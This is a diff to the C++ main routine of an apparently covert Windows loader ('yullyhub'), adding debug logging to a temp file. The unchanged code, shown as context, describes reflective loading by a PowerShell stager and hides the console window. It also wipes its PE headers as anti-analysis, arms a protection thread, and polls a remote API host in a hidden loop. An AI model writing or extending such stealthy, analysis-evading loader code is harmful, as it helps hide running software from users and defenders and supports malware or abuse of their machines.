@@ -44,27 +44,56 @@ static void gen_loader_id() {
                       g_loader_id.end());
 }
 
+// Redirect stdout/stderr to %TEMP%\yullyhub.log so we can debug when
+// the PowerShell window is hidden and there's no visible console.
+static void open_log() {
+    char tempPath[MAX_PATH]; GetTempPathA(MAX_PATH, tempPath);
+    std::string path = std::string(tempPath) + "yullyhub.log";
+    FILE* f = freopen(path.c_str(), "a", stdout);
+    if (f) setvbuf(f, NULL, _IONBF, 0);
+    f = freopen(path.c_str(), "a", stderr);
+    if (f) setvbuf(f, NULL, _IONBF, 0);
+    std::cout << "\n=== " << GetTickCount64() << " loader boot ===" << std::endl;
+}
+
 int main(int argc, char** argv) {
     (void)argc; (void)argv;
 
+    open_log();
+    std::cout << "[main] log opened" << std::endl;
+
     // Hide whatever console we're attached to. When reflectively loaded
     // by the PowerShell stager this is PowerShell's window itself.
-    if (HWND con = GetConsoleWindow()) ShowWindow(con, SW_HIDE);
+    if (HWND con = GetConsoleWindow()) {
+        ShowWindow(con, SW_HIDE);
+        std::cout << "[main] console hidden" << std::endl;
+    }
 
-    // Anti-analysis. Wipe headers first, then start the polling thread.
     protect::wipe_headers();
     protect::start_protection_thread();
+    std::cout << "[main] protect armed" << std::endl;
 
     control::install_kill_switch();
     control::install_console_ctrl_handler();
     configure_from_env();
     gen_loader_id();
+    std::cout << "[main] id=" << g_loader_id.substr(0, 8)
+              << " host=" << g_api_host << ":" << g_api_port
+              << (g_api_https ? " https" : " http") << std::endl;
 
     WSADATA wsa;
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        std::cerr << "[main] WSAStartup failed" << std::endl;
+        return 1;
+    }
+    std::cout << "[main] winsock ready" << std::endl;
 
     control::start_local_server();
+    std::cout << "[main] local server started on port " << control::local_port << std::endl;
+
     launcher::open_dashboard_browser_if_needed();
+    std::cout << "[main] browser handoff done, entering poll loop" << std::endl;
+
     control::run_poll_loop();   // blocks
 
     WSACleanup();
